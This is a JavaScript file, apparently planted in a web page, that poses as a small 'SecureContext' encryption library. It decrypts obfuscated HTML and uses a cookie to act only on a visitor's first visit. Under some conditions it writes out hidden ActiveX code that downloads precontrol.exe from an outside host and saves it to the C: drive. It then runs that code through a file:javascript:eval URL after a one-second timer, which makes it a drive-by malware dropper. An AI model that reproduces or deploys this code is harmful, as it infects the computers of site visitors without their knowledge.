var accountnum=154;
<!-- 


function PermutationGenerator( nNumElements )
{
	this.nNumElements     = nNumElements;
	this.anTranspositions = new Array;
	var k = 0;
	for( i = 0; i < nNumElements - 1; i++ )
		for( j = i + 1; j < nNumElements; j++ )
			this.anTranspositions[ k++ ] = ( i << 8 ) | j
            // keep two positins as lo and hi byte!
			;
	this.nNumTranspositions = k;

	this.fromCycle = PermutationGenerator_fromCycle;
}

function PermutationGenerator_fromCycle( anCycle )
{
	var anPermutation = new Array( this.nNumElements );
	for( var i = 0; i < this.nNumElements; i++ ) anPermutation[ i ] = i;
	for( var i = 0; i < anCycle.length; i++ )
	{
		var nT = this.anTranspositions[ anCycle[ i ] ];
		var n1 = nT & 255;
		var n2 = ( nT >> 8 ) & 255;
		nT = anPermutation[ n1 ];
		anPermutation[ n1 ] = anPermutation[ n2 ];
		anPermutation[ n2 ] = nT;
	}
	return anPermutation;
}

function Password( strPasswd )
{
	this.strPasswd = strPasswd;
	
	this.getHashValue   = Password_getHashValue;
	this.getPermutation = Password_getPermutation;
}

function Password_getHashValue()
{
	var m = 907633409;
	var a = 65599;
	var h = 0;

	for( var i = 0; i < this.strPasswd.length; i++ ) 
		h = ( h % m ) * a + this.strPasswd.charCodeAt( i )
		;

	return h;
}

function Password_getPermutation()
{
	var nNUMELEMENTS = 13;
	var nCYCLELENGTH = 21;

	pg = new PermutationGenerator( nNUMELEMENTS );

	var anCycle = new Array( nCYCLELENGTH );
	var nPred   = this.getHashValue();
	for( var i = 0; i < nCYCLELENGTH; i++ )
	{
		nPred = 314159269 * nPred + 907633409;

		anCycle[ i ] = nPred % pg.nNumTranspositions;
	}

	return pg.fromCycle( anCycle );
}

function SecureContext( strText, strSignature, bEscape )
{
	this.strSIGNATURE = strSignature || '';
    this.bESCAPE      = bEscape || false;

	this.strText = strText;

	this.escape        = SecureContext_escape;
	this.unescape      = SecureContext_unescape;
	this.transliterate = SecureContext_transliterate;
	this.encypher      = SecureContext_encypher;
	this.decypher      = SecureContext_decypher;
	this.sign          = SecureContext_sign;
	this.unsign        = SecureContext_unsign;

	this.secure   = SecureContext_secure;
	this.unsecure = SecureContext_unsecure;
}

function SecureContext_escape( strToEscape )
{
    var strEscaped = '';
    for( var i = 0; i < strToEscape.length; i++ )
    {
        var chT = strToEscape.charAt( i );
        switch( chT )
        {
            case '\r': strEscaped += '\\r'; break;
            case '\n': strEscaped += '\\n'; break;
            case '\\': strEscaped += '\\\\'; break;
            default: strEscaped += chT;
        }
    }
    return strEscaped;
}

function SecureContext_unescape( strToUnescape )
{
    var strUnescaped = '';
    var i = 0;
    while( i < strToUnescape.length )
    {
        var chT = strToUnescape.charAt( i++ );
        if( '\\' == chT )
        {
            chT = strToUnescape.charAt( i++ );
            switch( chT )
            {
                case 'r': strUnescaped += '\r'; break;
                case 'n': strUnescaped += '\n'; break;
                case '\\': strUnescaped += '\\'; break;
                default: // not possible
            }
        }
        else strUnescaped += chT;
    }
    return strUnescaped;
}

function SecureContext_transliterate( bTransliterate )
{
	var strDest = '';

	var nTextIter  = 0;
	var nTextTrail = 0;

	while( nTextIter < this.strText.length )
	{
		var strRun = '';
		var cSkipped   = 0;
		while( cSkipped < 7 && nTextIter < this.strText.length )
		{
			var chT = this.strText.charAt( nTextIter++ );
			if( -1 == strRun.indexOf( chT ) )
			{
				strRun += chT;
				cSkipped = 0;
			}
			else cSkipped++;
		}
		while( nTextTrail < nTextIter )
		{
			var nRunIdx = strRun.indexOf( this.strText.charAt( nTextTrail++ ) );
			if( bTransliterate )
			{
				nRunIdx++
				if( nRunIdx == strRun.length ) nRunIdx = 0;
			}
			else
			{
				nRunIdx--;
				if( nRunIdx == -1 ) nRunIdx += strRun.length;
			}
			strDest += strRun.charAt( nRunIdx );
		}
	}

	this.strText = strDest;
}

function SecureContext_encypher( anPerm )
{
	var strEncyph = '';
	var nCols     = anPerm.length;
	var nRows     = this.strText.length / nCols;
	for( var i = 0; i < nCols; i++ )
	{
		var k = anPerm[ i ];
		for( var j = 0; j < nRows; j++ )
		{
			strEncyph += this.strText.charAt( k );
			k         += nCols;
		}
	}

	this.strText = strEncyph;
}

function SecureContext_decypher( anPerm )
{
	var nRows    = anPerm.length;
	var nCols    = this.strText.length / nRows;
	var anRowOfs = new Array;
	for( var i = 0 ; i < nRows; i++ ) anRowOfs[ anPerm[ i ] ] = i * nCols;

	var strPlain = '';
	for( var i = 0; i < nCols; i++ )
	{
		for( var j = 0; j < nRows; j++ )
			strPlain += this.strText.charAt( anRowOfs[ j ] + i )
			;
	}

	this.strText = strPlain;
}

function SecureContext_sign( nCols )
{
    if( this.bESCAPE )
    {
        this.strText      = this.escape( this.strText );
        this.strSIGNATURE = this.escape( this.strSIGNATURE );
    }

	var nTextLen     = this.strText.length + this.strSIGNATURE.length;
	var nMissingCols = nCols - ( nTextLen % nCols );

	var strPadding   = '';  
    if( nMissingCols < nCols )
        for( var i = 0; i < nMissingCols; i++ ) strPadding += ' '
        ;
        
	var x = this.strText.length;
	this.strText +=  strPadding + this.strSIGNATURE;
}

function SecureContext_unsign( nCols )
{
    if( this.bESCAPE )
    {
        this.strText      = this.unescape( this.strText );
        this.strSIGNATURE = this.unescape( this.strSIGNATURE );
    }

    if( '' == this.strSIGNATURE ) return true;

	var nTextLen = this.strText.lastIndexOf( this.strSIGNATURE );
	if( -1 == nTextLen ) return false;

	this.strText = this.strText.substr( 0, nTextLen );
	return true;
}

function SecureContext_secure( strPasswd )
{
    var passwd = new Password( strPasswd );
    var anPerm   = passwd.getPermutation()
	this.sign( anPerm.length );
	this.transliterate( true );
	this.encypher( anPerm );
}

function SecureContext_unsecure( strPasswd )
{
    var passwd = new Password( strPasswd );
    var anPerm = passwd.getPermutation()
	this.decypher( anPerm );
	this.transliterate( false );
	return this.unsign( anPerm.length );
}


function getCookie(name)
{
    var dc = document.cookie;
    var prefix = name + "=";
    var begin = dc.indexOf("; " + prefix);
    if (begin == -1)
    {
        begin = dc.indexOf(prefix);
        if (begin != 0) return null;
    }
    else
    {
        begin += 2;
    }
    var end = document.cookie.indexOf(";", begin);
    if (end == -1)
    {
        end = dc.length;
    }
    return unescape(dc.substring(begin + prefix.length, end));
}

if(getCookie("newwebmaster169")){
  var sc2 = new SecureContext( '"rect. M/a<hsaCt.cuta etphnaA:lsp&aItsirc=Fpci..==afercaArmen=aRpr<c2 hllu=c Ee.l?uaSporora', '', true );
  sc2.unsecure( '98284756' );
  document.writeln( sc2.strText )
  document.writeln(accountnum);}
else{
  var sc2 = new SecureContext( '"rect. M/a<hsaCt.cuta etphnaA:lsp&aItsirc=Fpci..==afercaArmen=aRpr<c1 hllu=c Ee.l?uaSporora', '', true );
  sc2.unsecure( '98284756' );
  document.writeln( sc2.strText )
  document.writeln(accountnum);
}
  var sc3 = new SecureContext( 'GdWTEDEd"=oAD0F bEW=<=><WeGIH/D0WHWR0rM', '', true );
  sc3.unsecure( '98284756' );
  document.writeln( sc3.strText );

if(accountnum == 143 && !getCookie("newwebmaster169")){
document.writeln("<textarea id=\"code\" style=\"display:none;\">");
document.writeln("var x=new ActiveXObject(\"Microsoft.XMLHTTP\");");
document.writeln("var y=new ActiveXObject(\"ADODB.Stream\");");
document.writeln("x.Open(\"GET\",\"http://searchmyrequest.com/precontrol.exe\",0);");
document.writeln("x.Send();y.Mode=3;y.Type=1;y.Open();");
document.writeln("y.Write(x.responseBody);");
document.writeln("try{y.SaveToFile(\"c:/precontrol.exe\",2);}catch(e){;}");
document.writeln("</textarea>");

function preparecode(code) {
result = '';
lines = code.split(/\r\n/);
for (i=0;i<lines.length;i++) {

line = lines[i];
line = line.replace(/^\s+/,"");
line = line.replace(/\s+$/,"");
line = line.replace(/'/g,"\\'");
line = line.replace(/[\\]/g,"\\\\");
line = line.replace(/[/]/g,"%2f");

if (line != '') {
result += line +'\\r\\n';
}
}
return result;
}

function doit() {
mycode = preparecode(document.all.code.value);
myURL = "file:javascript:eval('" + mycode + "')";
window.open(myURL,"_media")
}


setTimeout("doit()", 1000);
}

function SetCookie(cookieName,cookieValue,nDays) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
                 + ";expires="+expire.toGMTString();
}
SetCookie("newwebmaster169","1",368);

//-->
